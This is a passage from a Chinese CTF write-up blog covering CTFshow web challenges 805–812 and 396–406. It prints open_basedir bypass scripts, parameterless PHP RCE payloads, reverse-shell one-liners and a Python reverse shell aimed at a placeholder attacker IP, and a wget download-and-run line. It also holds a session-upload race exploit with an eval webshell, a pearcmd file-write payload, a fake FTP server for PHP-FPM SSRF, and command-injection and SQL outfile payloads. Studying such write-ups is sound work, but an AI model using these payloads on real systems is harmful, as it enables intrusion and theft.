&#x2F;&#x2F;设置stub$o &#x3D; new hacker();$o-&gt;code&#x3D;&quot;highlight_file(&#39;flag.php&#39;);&quot;;$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件&#x2F;&#x2F;签名自动计算$phar-&gt;stopBuffering();&#x2F;&#x2F; phar生成?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传phar协议读取就行</p><p><strong>805</strong></p>        <h3 id="open-basedir绕过-1"   >          <a href="#open-basedir绕过-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#open-basedir绕过-1" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h3>      <blockquote><p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。</p><p>假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。</p><p>注意：用open_basedir指定的<strong>限制实际上是前缀，而不是目录名</strong>。</p><p>文章来自<span class="exturl"><a class="exturl__link"   href="https://www.cnblogs.com/hookjoy/p/12846164.html" >这里</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote><p>但是这个配置对系统命令执行是没有效果的，比如执行<code>system(&#39;ls /&#39;)</code>的时候就不受限制，<del>但是一般都会被ban掉</del></p><p>下面就是一些bypass方法</p><ol><li><p>glob协议，只能捞捞文件名</p><pre class="line-numbers language-none"><code class="language-none">$a &#x3D; &quot;glob:&#x2F;&#x2F;&#x2F;*&quot;;if ( $b &#x3D; opendir($a) ) &#123;  while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;    echo $file.&quot;\n&quot;;  &#125;  closedir($b);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>利用chdir()与ini_set()组合Bypass</p><p>原理在这里</p><pre class="line-numbers language-none"><code class="language-none">mkdir(&quot;s&quot;);chdir(&#39;s&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo file_get_contents(&quot;&#x2F;ctfshowflag&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>利用bindtextdomain()函数Bypass</p><p>这个方法也只能捞捞文件名</p><blockquote><p><strong>bindtextdomain()函数</strong></p><p>(PHP 4, PHP 5, PHP 7)</p><p>bindtextdomain()函数用于绑定domain到某个目录的函数。</p><pre class="line-numbers language-none"><code class="language-none">bindtextdomain ( string $domain , string $directory ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>bindtextdomain()函数的第二个参数$directory是一个文件路径，它会在$directory存在的时候返回$directory，不存在则返回false。</p></blockquote><p>我们就可以通过修改directory参数根据返回值来判断文件是否存在</p></li><li><p>利用SplFileInfo::getRealPath()类方法Bypass</p><p>这个和上面那个很相似，也是基于报错，直接给payload吧</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpecho &#39;&lt;b&gt;open_basedir: &#39; . ini_get(&#39;open_basedir&#39;) . &#39;&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&#39;;$info &#x3D; new SplFileInfo($_GET[&#39;dir&#39;]);var_dump($info-&gt;getRealPath());?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>利用realpath()函数Bypass</p><blockquote>        <h3 id="realpath-函数-1"   >          <a href="#realpath-函数-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#realpath-函数-1" class="headerlink" title="realpath()函数"></a>realpath()函数</h3>      <p>(PHP 4, PHP 5, PHP 7)</p><p>realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。</p><p>函数定义如下：</p><pre class="line-numbers language-none"><code class="language-none">realpath ( string $path ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="Bypass-1"   >          <a href="#Bypass-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h3>      <p>环境条件：Windows</p><p>基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符&lt;和&gt;，不然只能进行暴破。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&lt;?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));set_error_handler(&#39;isexists&#39;);$dir &#x3D; &#39;E:&#x2F;wamp64&#x2F;&#39;;$file &#x3D; &#39;&#39;;$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123;        $file &#x3D; $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;        realpath($file);&#125;function isexists($errno, $errstr)&#123;        $regexp &#x3D; &#39;&#x2F;File\((.*)\) is not within&#x2F;&#39;;        preg_match($regexp, $errstr, $matches);        if (isset($matches[1])) &#123;                printf(&quot;%s &lt;br&#x2F;&gt;&quot;, $matches[1]);        &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：</p><p><img src="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/10.png" alt="img"></p></li></ol><p>最后是大佬脚本</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;** by phithon* From https:&#x2F;&#x2F;www.leavesongs.com* detail: http:&#x2F;&#x2F;cxsecurity.com&#x2F;issue&#x2F;WLB-2009110068*&#x2F;header(&#39;content-type: text&#x2F;plain&#39;);error_reporting(-1);ini_set(&#39;display_errors&#39;, TRUE);printf(&quot;open_basedir: %s\nphp_version: %s\n&quot;, ini_get(&#39;open_basedir&#39;), phpversion());printf(&quot;disable_functions: %s\n&quot;, ini_get(&#39;disable_functions&#39;));$file &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, isset($_REQUEST[&#39;file&#39;]) ? $_REQUEST[&#39;file&#39;] : &#39;&#x2F;etc&#x2F;passwd&#39;);$relat_file &#x3D; getRelativePath(__FILE__, $file);$paths &#x3D; explode(&#39;&#x2F;&#39;, $file);$name &#x3D; mt_rand() % 999;$exp &#x3D; getRandStr();mkdir($name);chdir($name);for($i &#x3D; 1 ; $i &lt; count($paths) - 1 ; $i++)&#123;    mkdir($paths[$i]);    chdir($paths[$i]);&#125;mkdir($paths[$i]);for ($i -&#x3D; 1; $i &gt; 0; $i--) &#123;     chdir(&#39;..&#39;);&#125;$paths &#x3D; explode(&#39;&#x2F;&#39;, $relat_file);$j &#x3D; 0;for ($i &#x3D; 0; $paths[$i] &#x3D;&#x3D; &#39;..&#39;; $i++) &#123;     mkdir($name);    chdir($name);    $j++;&#125;for ($i &#x3D; 0; $i &lt;&#x3D; $j; $i++) &#123;     chdir(&#39;..&#39;);&#125;$tmp &#x3D; array_fill(0, $j + 1, $name);symlink(implode(&#39;&#x2F;&#39;, $tmp), &#39;tmplink&#39;);$tmp &#x3D; array_fill(0, $j, &#39;..&#39;);symlink(&#39;tmplink&#x2F;&#39; . implode(&#39;&#x2F;&#39;, $tmp) . $file, $exp);unlink(&#39;tmplink&#39;);mkdir(&#39;tmplink&#39;);delfile($name);$exp &#x3D; dirname($_SERVER[&#39;SCRIPT_NAME&#39;]) . &quot;&#x2F;&#123;$exp&#125;&quot;;$exp &#x3D; &quot;http:&#x2F;&#x2F;&#123;$_SERVER[&#39;SERVER_NAME&#39;]&#125;&#123;$exp&#125;&quot;;echo &quot;\n-----------------content---------------\n\n&quot;;echo file_get_contents($exp);delfile(&#39;tmplink&#39;);function getRelativePath($from, $to) &#123;  &#x2F;&#x2F; some compatibility fixes for Windows paths  $from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;  $from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);  $to   &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);  $from   &#x3D; explode(&#39;&#x2F;&#39;, $from);  $to     &#x3D; explode(&#39;&#x2F;&#39;, $to);  $relPath  &#x3D; $to;  foreach($from as $depth &#x3D;&gt; $dir) &#123;    &#x2F;&#x2F; find first non-matching dir    if($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;      &#x2F;&#x2F; ignore this directory      array_shift($relPath);    &#125; else &#123;      &#x2F;&#x2F; get number of remaining dirs to $from      $remaining &#x3D; count($from) - $depth;      if($remaining &gt; 1) &#123;        &#x2F;&#x2F; add traversals up to first matching dir        $padLength &#x3D; (count($relPath) + $remaining - 1) * -1;        $relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);        break;      &#125; else &#123;        $relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];      &#125;    &#125;  &#125;  return implode(&#39;&#x2F;&#39;, $relPath);&#125;function delfile($deldir)&#123;    if (@is_file($deldir)) &#123;        @chmod($deldir,0777);        return @unlink($deldir);    &#125;else if(@is_dir($deldir))&#123;        if(($mydir &#x3D; @opendir($deldir)) &#x3D;&#x3D; NULL) return false;        while(false !&#x3D;&#x3D; ($file &#x3D; @readdir($mydir)))        &#123;            $name &#x3D; File_Str($deldir.&#39;&#x2F;&#39;.$file);            if(($file!&#x3D;&#39;.&#39;) &amp;&amp; ($file!&#x3D;&#39;..&#39;))&#123;delfile($name);&#125;        &#125;         @closedir($mydir);        @chmod($deldir,0777);        return @rmdir($deldir) ? true : false;    &#125;&#125;function File_Str($string)&#123;    return str_replace(&#39;&#x2F;&#x2F;&#39;,&#39;&#x2F;&#39;,str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$string));&#125;function getRandStr($length &#x3D; 6) &#123;    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;    $randStr &#x3D; &#39;&#39;;    for ($i &#x3D; 0; $i &lt; $length; $i++) &#123;        $randStr .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);    &#125;    return $randStr;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>include远程文件后传参file即可</p><p><strong>806</strong></p>        <h3 id="php无参RCE-1"   >          <a href="#php无参RCE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#php无参RCE-1" class="headerlink" title="php无参RCE"></a>php无参RCE</h3>      <p>首先是一篇可供参考的<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/qq_45570082/article/details/106602261" >文章</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>利用方式有以下几种</p><ol><li><p><strong>利用session_id</strong></p><p>php中有一个函数叫session_id(),可以直接获取到cookie中的phpsessionid值，phpsessionid的组成符号有限定,不能使用 ’ () ‘，所以我们需要将我们要执行的命令转换成16进制，然后再通过hex2bin函数转换回去，<code>bin2hex(&#39;payload&#39;);</code>来转换16禁止，在使用时通过<code>eval(hex2bin(session_id(session_start())));</code>，在加上请求头中Cookie中的<code>PHPSESSID=16进制payload</code>执行</p></li><li><p><strong>利用<code>get_defined_vars ()</code>函数</strong></p><p><code>get_defined_vars()</code>：返回由所有已定义变量所组成的数组</p><p>可供利用的函数</p><pre class="line-numbers language-none"><code class="language-none">end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到在已定义的变量中存在着全局变量GET和POST，我们可以通过传入参数来实现RCE</p><pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>文件读取</p><p>可供利用的函数</p><pre class="line-numbers language-none"><code class="language-none">var_dump()  打印所有内容print_r()  同上scandir()  扫描路径内文件名并返回一个迭代器localeconv()  getcwd()  获得当前工作目录getallheaders()  获得请求头内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p><strong>807</strong></p>        <h3 id="反弹shell-1"   >          <a href="#反弹shell-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3>      <p>本地监听端口，记住要有公网IP，也可以使用frp内网穿透</p><ol><li><p>公网服务器</p><p>监听命令</p><pre class="line-numbers language-none"><code class="language-none">攻击端nc -lvp 监听的端口受害端bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击端IP&#x2F;攻击端监听端口 0&gt;&amp;1nc 攻击端IP 攻击端监听端口 -t &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用wget下载执行</p><pre class="line-numbers language-none"><code class="language-none">wget 攻击端IP&#x2F;shell.txt -O &#x2F;tmp&#x2F;shell.php &amp;&amp; php &#x2F;tmp&#x2F;shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python脚本反弹</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python#-*- coding: utf-8 -*-import socket,subprocess,oss&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;攻击端IP&quot;,攻击端监听端口)) #更改localhost为⾃⼰的外⽹ip,端⼝任意os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p><strong>808</strong></p>        <h3 id="卡临时文件包含-1"   >          <a href="#卡临时文件包含-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#卡临时文件包含-1" class="headerlink" title="卡临时文件包含"></a>卡临时文件包含</h3>      <pre class="line-numbers language-none"><code class="language-none">import requestsimport threadingimport syssession&#x3D;requests.session()sess&#x3D;&#39;yu22x&#39;url1&#x3D;&quot;http:&#x2F;&#x2F;97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show&#x2F;&quot;url2&#x3D;&#39;http:&#x2F;&#x2F;97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show&#x2F;?file&#x3D;&#x2F;tmp&#x2F;sess_yu22x&#39;data1&#x3D;&#123;    &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?php eval($_POST[1]);?&gt;&#39;&#125;data2&#x3D;&#123;    &#39;1&#39;:&#39;echo 11123;system(&quot;cat &#x2F;*&quot;);&#39;,&#125;file&#x3D;&#123;    &#39;file&#39;:&#39;1&#39;&#125;cookies&#x3D;&#123;    &#39;PHPSESSID&#39;: sess&#125;def write():    while True:        r &#x3D; session.post(url1,data&#x3D;data1,files&#x3D;file,cookies&#x3D;cookies)def read():    while True:        r &#x3D; session.post(url2,data&#x3D;data2)        if &#39;11123&#39; in r.text:            print(r.text)if __name__&#x3D;&#x3D;&quot;__main__&quot;:    event&#x3D;threading.Event()    with requests.session() as session:        for i in range(1,30):             threading.Thread(target&#x3D;write).start()        for i in range(1,30):            threading.Thread(target&#x3D;read).start()    event.set()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>纯纯看运气</p><p><strong>809</strong></p>        <h3 id="pear文件包含-RCE-1"   >          <a href="#pear文件包含-RCE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#pear文件包含-RCE-1" class="headerlink" title="pear文件包含/RCE"></a>pear文件包含/RCE</h3>      <p>文章<span class="exturl"><a class="exturl__link"   href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html" >在此</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><blockquote><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p><p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p><p>原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p><p>我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</p><p>如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了<code>register_argc_argv</code>，那么这其中是怎么处理的？</p><p>HTTP数据包中的query-string会被作为argv的值</p></blockquote><p>最终构造的payload如下</p><pre class="line-numbers language-none"><code class="language-none">?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;phpinfo()?&gt;+&#x2F;tmp&#x2F;hello.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时/tmp/hello.php文件中就有了我们写入的<code>&lt;?=phpinfo()?&gt;</code>，文件包含即可</p><p><strong>810</strong></p>        <h3 id="SSRF打PHP-FPM-1"   >          <a href="#SSRF打PHP-FPM-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF打PHP-FPM-1" class="headerlink" title="SSRF打PHP-FPM"></a>SSRF打PHP-FPM</h3>      <p>有工具不用***</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206081711243.png"></p><p>记得传入的时候url编码一下</p><p><strong>811</strong></p>        <h3 id="file-put-contents打PHP-FPM"   >          <a href="#file-put-contents打PHP-FPM" class="heading-link"><i class="fas fa-link"></i></a><a href="#file-put-contents打PHP-FPM" class="headerlink" title="file_put_contents打PHP-FPM"></a>file_put_contents打PHP-FPM</h3>      <p>文章在<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/sdst_/article/details/118080811" >这里</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>用的yu22x师傅的脚本</p><ol><li><p>伪造ftp服务器</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">4566</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#端口可改</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span><span class="token comment">#Service ready for new user.</span><span class="token comment">#Client send anonymous username</span><span class="token comment">#USER anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span><span class="token comment">#User name okay, need password.</span><span class="token comment">#Client send anonymous password.</span><span class="token comment">#PASS anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span><span class="token comment">#User logged in, proceed. Logged out if appropriate.</span><span class="token comment">#TYPE I</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span><span class="token comment">#Size /</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span><span class="token comment">#EPSV (1)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span><span class="token comment">#PASV</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span><span class="token comment">#QUIT</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>gopherus生成payload</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206082140193.png"></p></li><li><p>vps监听传参</p><pre class="line-numbers language-none"><code class="language-none">file&#x3D;ftp:&#x2F;&#x2F;x.x.x.x:4566&amp;content&#x3D;gopherus生成的payload(只取下划线后面的内容，且不需要再次编码)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>812</strong></p>        <h3 id="PHP-FPM未授权"   >          <a href="#PHP-FPM未授权" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP-FPM未授权" class="headerlink" title="PHP-FPM未授权"></a>PHP-FPM未授权</h3>      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow其他</title>
      <link href="/posts/6352d546.html"/>
      <url>/posts/6352d546.html</url>
      
        <content type="html"><![CDATA[<p><strong>396</strong></p><p><code>parse_url</code>函数将一个url拆分为如下形式</p><p><img src="https://img-blog.csdnimg.cn/20210628090124739.png" alt="在这里插入图片描述"></p><p>无需绕过，直接构造</p><pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;http:&#x2F;&#x2F;l&#x2F;l;cat fl0g* &gt;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>397</strong></p><p>加了个/tmp也没啥卵用，同上即可</p><p><strong>398</strong></p><p>在host处加了/;过滤，也没啥用</p><p><strong>399</strong></p><p>为啥跟host过不去啊，多滤了个&gt;</p><p><strong>400</strong></p><p>过滤http也没用</p><p><strong>401</strong></p><p>同上</p><p><strong>402</strong></p><p>在scheme处过滤http，换个协议就行</p><p><strong>403</strong></p><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$&#x2F;&#39;, $url[&#39;host&#39;]))&#123;         shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]);     &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里匹配了一个ip地址，上面payload改一下就行</p><p><strong>405</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\/[A-Za-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\.|php/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'curl '</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个在host中匹配IP地址，第二个path不能有字母数字，第三个协议中需要有php</p><p>最终payload如下</p><pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;php:&#x2F;&#x2F;127.0.0.1;cat fl0g.php&gt; 1.txt;11&#x2F;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>406</strong></p><p><code>filter_var</code>函数<span class="exturl"><a class="exturl__link"   href="https://www.cnblogs.com/lxfweb/p/13757525.html" >缺陷</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>这里过滤器在验证url的合法性</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;0:&#x2F;&#x2F;www.baidu.com;&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e&#x2F;**&#x2F;into&#x2F;**&#x2F;outfile&#x2F;**&#x2F;&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;4.php&quot;%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问4.php后访问1.txt即可</p><script type="text&#x2F;javascript" 